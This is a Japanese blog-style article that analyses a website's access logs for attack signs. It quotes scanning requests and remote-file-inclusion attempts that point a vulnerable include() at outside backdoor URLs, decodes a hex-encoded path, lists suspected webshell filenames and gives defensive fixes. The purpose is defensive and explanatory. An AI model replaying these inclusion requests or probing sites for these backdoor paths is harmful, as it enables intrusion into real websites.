# ウェブサイトのアクセスログから見る攻撃の兆候と対策

ウェブサイトのアクセスログには、日々のアクセス履歴だけでなく、悪意のある攻撃者がサイトの弱点を探し、侵入を試みているサインも記録されています。これらのログを分析することで、どのような攻撃が試みられているのか、その手口と対策を把握できます。

-----

## 1\. ログから読み解く攻撃者の意図

以下は、実際にログから抽出されたアクセスパターンとその攻撃意図です。これらのアクセスは、多くの場合、自動化されたツールによって行われています。

### PHPの脆弱性スキャン

```
/install-php-7-on-centos-6-centos-7-rhel-7-redhat-7/ HTTP/1.1" 301 ...
install-php-7-on-centos-6-centos-7-rhel-7-redhat-7/ HTTP/1.1" 301 ...
install-php-7-on-centos-6-centos-7-rhel-7-redhat-7/ HTTP/1.1" 404 ...
```
**読み解き:** 攻撃者が**PHP 7に関する既知の脆弱性**や、誤って公開された**設定ファイル・デバッグファイル**を探しています。あなたのサイトのPHPバージョンに関わらず、広く使われるパスを片っ端から試しています。最終的に`404 Not Found`になっている場合、該当ファイルは存在しないため、攻撃は失敗しています。

### バイナリで隠された不正アクセス

```
golem.works 172.207.159.178 - - [30/Jul/2025:17:44:32 +0900] "GET /autoload_classmap.php?p=2f686f6d652f6470776f736867782f646f6d61696e732f6b696d7370656c6c732e636f6d2f7075626c69635f68746d6c HTTP/1.1" 404 129171 "-" "-"
```
以下のコードで16解析進数解析。
※b.txtに"2f686f6d652f6470776f736867782f646f6d61696e732f6b696d7370656c6c732e636f6d2f7075626c69635f68746d6c"を書き込み保存。

python
```
# Pythonで復号
with open("b.txt", "r") as f:
    hex_string = f.read().strip()
    print(bytes.fromhex(hex_string).decode('utf-8'))

```

結果：

```
/home/dpwoshgx/domains/kimspells.com/public_html
```

バイナリで隠されたパスをデコードすることで、攻撃者が狙っていたディレクトリが明らかになります。
autoload_classmap.php を介したリモートファイル操作が目的と考えられます。

**読み解き:** 特定のユーザー（dpwoshgx）のホームディレクトリ内にある kimspells.com ドメインのウェブサイトの公開ディレクトリを指しています。
autoload_classmap.phpを使って、kimspells.com のウェブサイトの公開ディレクトリ内にあるファイルやディレクトリの情報を取得しようとしていたことになります.



### 隠された不正ファイルの探査

```
/wp-includes/images/wp-login.php HTTP/1.1" 403 ...
/wp-admin/images/index.php HTTP/1.1" 403 ...
/css/index.php HTTP/1.1" 301 ...
/wp-content/product.php HTTP/1.1" 301 ...
/wp-includes/ID3/index.php HTTP/1.1" 301 ...
```

**読み解き:** 画像やCSS、フォントのディレクトリ（`/images/`, `/css/`, `/fonts/`）のように、通常は静的なファイルが置かれる場所に、\*\*不正なPHPファイル（Webシェルやバックドア）\*\*が隠されていないかを探しています。また、特定のプラグイン（例: `product.php`）やライブラリ（例: `ID3`）の脆弱性も狙われます。`403 Forbidden`や`404 Not Found`は、サーバーがアクセスを正しく拒否していることを示します。

### WordPressの重要ファイルを狙った攻撃

```
/wp-admin/network/wp-conflg.php HTTP/1.1" 403 ...
/wp-includes/blocks/wp-conflg.php HTTP/1.1" 301 ...
/wp-content/themes/twentytwentytwo/index.php HTTP/1.1" 301 ...
```

**読み解き:** WordPressの最も重要な設定ファイル`wp-config.php`を、**スペルミス**（例: `wp-conflg.php`）を含んだパスで探すことで、管理者による設定ミスや特定の脆弱性を悪用しようとします。また、デフォルトテーマ（`twentytwentytwo`など）やWordPressのコアディレクトリ（`wp-includes/blocks/`）の脆弱性や不正ファイルも狙われます。これらのアクセスも、`403 Forbidden`や`404 Not Found`で適切にブロックされていることが多いです。

### その他の広範囲なスキャン

```
/.well-known/gecko-litespeed.php HTTP/1.1" 301 ...
/wow/ HTTP/1.1" 301 ...
```

**読み解き:** `.well-known`のような標準化された特殊ディレクトリや、意味不明な短いパス（`/wow/`など）へのアクセスも頻繁に見られます。これらは、特定のサーバー設定や、過去に悪用されたことのあるファイル、あるいは単純にランダムなパスを試すことで、**思わぬ設定ミスや隠れた脆弱性**がないかを探す試みです。



### ■images置き場に配置ミスを装ったindex.php仕込んであるかスキャンしている。
```
/wp-includes/images/wp-login.php HTTP/1.1" 403 2875 "-" "-"
/wp-admin/images/index.php HTTP/1.1" 403 2875 "-" "-"
```
<br>

### ■wp-config.phpのタイポを狙ってパスワード漏洩を狙っている。
```
/wp-admin/network/wp-conflg.php HTTP/1.1" 403 2875 "-" "-"
/wp-includes/blocks/wp-conflg.php HTTP/1.1" 301 257 "-" "-"
wp-includes/blocks/wp-conflg.php HTTP/1.1" 301 261 "-" "-"
wp-includes/blocks/wp-conflg.php HTTP/1.1" 404 2814 "-" "-"
```

<br>

### ■wp初期テーマから脆弱性をスキャンしている。
```
/wp-content/themes/twentytwentytwo/index.php HTTP/1.1" 301 268 "-" "-"
wp-content/themes/twentytwentytwo/index.php HTTP/1.1" 301 272 "-" "-"
wp-content/themes/twentytwentytwo/index.php HTTP/1.1" 404 2814 "-" "-"
```

<br>

### ■fontファルダから配置ミスを装ったindex.php仕込んであるかスキャンしている。
```
/wp-includes/fonts/index.php HTTP/1.1" 301 252 "-" "-"
wp-includes/fonts/index.php HTTP/1.1" 301 256 "-" "-"
wp-includes/fonts/index.php HTTP/1.1" 404 2814 "-" "-"
```

<br>

### ■コードの脆弱性を狙った攻撃
```
 48.210.47.150 - - [25/Jul/2025:08:49:34 +0900] "GET /autoload_classmap.phphttps://ranchimprovements.com/byp.php HTTP/1.1" 301 0 "-" "-"
 48.210.47.150 - - [25/Jul/2025:08:49:34 +0900] "GET /autoload_classmap.phphttps:/ranchimprovements.com/byp.php HTTP/1.1" 404 34487 "-" "-"
 48.210.47.150 - - [25/Jul/2025:08:49:41 +0900] "GET /wp-content/upgrade/index.phphttps://avocadorentals.com/wp-includes/style-engine/about.php HTTP/1.1" 301 0 "-" "-"
 48.210.47.150 - - [25/Jul/2025:08:49:41 +0900] "GET /wp-content/upgrade/index.phphttps:/avocadorentals.com/wp-includes/style-engine/about.php HTTP/1.1" 404 34487 "-" "-"
 ```

file内の
include($_GET['file']);
を使ってバックドアファイルをインストールさせようとしている。

include($_GET['file']);
はこのまま使うのは危険。以下のようにして使うこと
ホワイトリスト方式
```
$allowed = ['header.php', 'footer.php'];

$file = $_GET['file'];

if (in_array($file, $allowed)) {

    include($file);

} else {

    echo "アクセス拒否";

}
```

拡張方式
```
$file = basename($_GET['file']); // ディレクトリトラバーサル防止

if (preg_match('/\.php$/', $file)) {

    include("templates/" . $file);

}
```

### ■通常のブラウザを装ったボットによるスキャン。
```
34.168.42.223 - - [25/Jul/2025:05:17:00 +0900] "HEAD /wordpress HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:00 +0900] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:02 +0900] "HEAD / HTTP/1.1" 200 0 "http:///" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:02 +0900] "HEAD /wp HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:02 +0900] "HEAD /wp/ HTTP/1.1" 404 0 "http:///wp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:02 +0900] "HEAD /bc HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:02 +0900] "HEAD /bk HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:02 +0900] "HEAD /backup HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:02 +0900] "HEAD /old HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:03 +0900] "HEAD /new HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:03 +0900] "HEAD /main HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:03 +0900] "HEAD /home HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.168.42.223 - - [25/Jul/2025:05:17:03 +0900] "HEAD / HTTP/1.1" 200 0 "http:///home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
```


-----

## 2\. 要注意ファイル：バックドアの可能性が高いファイル名リスト

ログに記録されたファイル名の中には、バックドアやWebシェル、あるいは脆弱性テストによく使われるものが含まれます。もし、これらのファイル名で**あなたのサーバーに身に覚えのないファイルが存在する**場合は、不正なものである可能性が極めて高いため、即座に削除してください。

### Webシェル・バックドア系（汎用的な名前、または隠蔽目的）

  * `1.php`
  * `as.php`
  * `byp.php`
  * `click.php`
  * `css.php` (CSSファイルに見せかけたPHPファイル)
  * `fm.php`
  * `fw.php`
  * `lv.php`
  * `m.php`
  * `mar.php`
  * `max.php`
  * `simple.php`
  * `shell.php`
  * `ty.php`
  * `w.php`
  * `ws.php`

### 管理・操作・情報開示系（管理者ツールや設定を装う）

  * `admin.php`
  * `edit.php`
  * `file.php`
  * `info.php` (phpinfo()関数によるサーバー情報表示目的)
  * `manager.php`

### WordPress関連（プラグイン・テーマ・コアファイル狙い）

  * `about.php`
  * `post.php`
  * `themes.php`
  * `wp.php`
  * `wp-trackback.php` (過去に脆弱性が報告されたトラックバック関連ファイル)

### ECサイト・商品関連（Eコマース系の機能を装う）

  * `buy.php`
  * `goods.php`
  * `item.php`
  * `product.php`

### エラー・防御・特定フレームワーク関連

  * `403.php` (アクセス禁止ページ)
  * `404.php` (ファイルが見つからないページ)
  * `alfa.php`
  * `alfanew.php`
  * `autoload_classmap.php` (PHPのクラス自動読み込み関連ファイル)
  * `bless.php`
  * `chosen.php`
  * `classwithtostring.php` (PHPの特定マジックメソッド脆弱性狙い)
  * `default.php`
  * `inputs.php`
  * `install.php`
  * `lock360.php` (セキュリティツール名に偽装)
  * `link.php`

-----

## 3\. 今すぐできるセキュリティ対策

ログ分析の結果、サイトがこれらの攻撃に対して適切に防御できていることが多いですが、継続的な対策が不可欠です。

  * **WordPress本体、テーマ、プラグインの常に最新バージョンへのアップデート**
    これが最も基本的な対策であり、既知の脆弱性を悪用した多くの攻撃を防ぎます。
  * **XserverのWAF（Web Application Firewall）の有効化**
    WAFは、これらの不正なアクセスパターンを自動的に検知・ブロックし、サイトを保護する強力な機能です。必ず有効になっているか確認しましょう。
  * **サーバー内のファイルの定期的な確認**
    FTPクライアントやサーバーのファイルマネージャーを使用して、公開ディレクトリ内に身に覚えのないファイルや不審なファイルが作成されていないか、定期的にチェックする習慣をつけましょう。
  * **不要なプラグイン・テーマの削除**
    使用していないプラグインやテーマは、セキュリティホールとなる可能性があるため、サーバーから完全に削除しましょう。

-----

